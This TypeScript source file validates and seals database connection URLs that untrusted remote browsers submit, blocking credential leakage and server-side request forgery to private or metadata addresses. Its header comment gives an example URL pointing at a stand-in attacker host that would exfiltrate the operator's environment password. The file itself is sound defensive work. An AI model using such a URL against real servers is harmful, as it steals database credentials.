/**
 * A database address that a browser beyond this machine typed.
 *
 * The connection form on a server bound past loopback is anyone's on the
 * network (trust.ts `clientTrusted`). What they type is dialled by this
 * process, with two consequences the operator never chose. The drivers fill a
 * part the URL leaves out from this process: `pg` takes a missing user and
 * password from `PGUSER`/`PGPASSWORD` (and `~/.pgpass`), so
 * `postgres://u@attacker.example/db` sent the operator's password to the
 * attacker's host. And the dial itself is a probe of whatever this machine can
 * reach — a port scanner for the private network, a client for the cloud
 * metadata service — with the driver's error as the answer.
 *
 * So an untrusted address is sealed: every part the driver would look up is
 * given explicitly from the URL (a missing password is the empty one, never
 * the environment's), the URL may carry only the parameters that read nothing
 * from this machine, and its host is resolved through the network policy with
 * loopback, private and link-local ranges refused — the address checked is
 * the address connected (networkPolicy.ts), so a name that rebinds changes
 * nothing. A connection the operator wrote (tablewalk.json, the command line,
 * a loopback browser) is untouched.
 */
import { Socket } from 'node:net';
import { checkedLookup, refusedLiteral, type NetworkPolicy } from './networkPolicy.js';

/** Where an untrusted address may go: the public network only. */
export const UNTRUSTED_NETWORK: NetworkPolicy = Object.freeze({ allowPrivate: false, allowLinkLocal: false });

/* The parameters that change nothing on this machine. Everything else is
   refused rather than dropped: `host=/var/run/postgresql` is a local socket,
   `sslcert=/path` and `sslrootcert=/path` read files, and mysql2 reads any
   option it knows (`socketPath`, `localAddress`) out of the query string. */
const PG_PARAMETERS = new Set(['sslmode', 'application_name']);
const PG_SSLMODES = new Set(['disable', 'prefer', 'require', 'verify-ca', 'verify-full', 'no-verify']);
const MYSQL_PARAMETERS = new Set<string>();

const MOVE_IT =
  'This server is reachable beyond this machine, so a connection added from the browser ' +
  'is dialled exactly as written and nothing is filled in from the server. ';

/**
 * Why a database URL from an untrusted client is refused before anything is
 * dialled, or null. Only PostgreSQL and MySQL URLs are read; the caller has
 * already refused the forms that are not network URLs.
 */
export function untrustedDatabaseRefusal(target: string): string | null {
  const postgres = /^postgres(ql)?:\/\//i.test(target);
  if (!postgres && !/^(mysql|mariadb):\/\//i.test(target)) return null;
  let url: URL;
  try {
    url = new URL(target);
  } catch {
    return `${MOVE_IT}This is not a URL that can be read.`;
  }
  if (!url.hostname) return `${MOVE_IT}Name the host in the URL.`;
  if (!url.username) return `${MOVE_IT}Name the user in the URL (user@host).`;
  const allowed = postgres ? PG_PARAMETERS : MYSQL_PARAMETERS;
  for (const [key, value] of url.searchParams) {
    const ok = allowed.has(key) || (postgres && key === 'sslrootcert' && value === 'system');
    if (!ok) return `${MOVE_IT}"${key}" cannot be set from the browser; put this connection in the config file on the server.`;
    if (key === 'sslmode' && !PG_SSLMODES.has(value)) return `${MOVE_IT}"sslmode=${value}" is not one this connection can use.`;
  }
  return null;
}

/* Kept out of the message a driver reports: the host is the caller's own, the addresses are what it resolved to. */
function refusal(host: string, addresses: string[]): Error {
  return new Error(
    `${host} resolves only to addresses a connection added from the browser may not reach (${addresses.join(', ')}). ` +
      'Put a connection to a private or local database in the config file on the server.',
  );
}

/**
 * A socket for a driver's `stream` option whose `connect(port, host)` is
 * resolved through `policy`. A host written as an address is checked before
 * any packet leaves, since Node never looks one up.
 */
function guardedSocket(policy: NetworkPolicy): Socket {
  const socket = new Socket();
  const connect = socket.connect.bind(socket) as (options: object) => Socket;
  const lookup = checkedLookup(policy, refusal);
  socket.connect = ((port: number, host: string) => {
    const literal = refusedLiteral(host, policy);
    if (literal) {
      // After the driver's own 'error' listener is in place, which it adds once connect returns.
      process.nextTick(() => socket.destroy(new Error(`The address ${literal} is one a connection added from the browser may not reach.`)));
      return socket;
    }
    return connect({ port, host, lookup });
  }) as Socket['connect'];
  return socket;
}

const decoded = (part: string) => decodeURIComponent(part);

/**
 * The `pg` options for a sealed address: no `connectionString`, because pg
 * merges its parse of one over explicit values, and its parse gives an absent
 * password as the empty string — which pg then reads as "not given" and fills
 * from `PGPASSWORD`. The password is a function for the same reason: it is
 * the one form pg takes as given even when it is empty, and the one that
 * skips `~/.pgpass`.
 */
export function sealedPgOptions(target: string, policy: NetworkPolicy): Record<string, unknown> {
  const url = new URL(target);
  const user = decoded(url.username);
  const password = decoded(url.password);
  const sslmode = url.searchParams.get('sslmode');
  const system = url.searchParams.get('sslrootcert') === 'system';
  const ssl =
    sslmode === 'disable'
      ? false
      : sslmode === 'no-verify'
        ? { rejectUnauthorized: false }
        : sslmode || system
          ? { rejectUnauthorized: true }
          : false;
  return {
    host: url.hostname.replace(/^\[|\]$/g, ''),
    port: url.port ? Number(url.port) : 5432,
    user,
    database: decoded(url.pathname.slice(1)) || user,
    password: () => password,
    ssl,
    ...(url.searchParams.get('application_name') ? { application_name: url.searchParams.get('application_name') } : {}),
    stream: () => guardedSocket(policy),
  };
}

/**
 * The mysql2 options for a sealed address: the URL as written (mysql2 fills
 * nothing from the environment), its socket resolved through `policy`. mysql2
 * uses a stream it is given as it stands, so this one dials itself.
 */
export function sealedMysqlOptions(target: string, policy: NetworkPolicy): { stream: () => Socket } {
  const url = new URL(target);
  const host = url.hostname.replace(/^\[|\]$/g, '');
  const port = url.port ? Number(url.port) : 3306;
  return { stream: () => guardedSocket(policy).connect(port, host) };
}
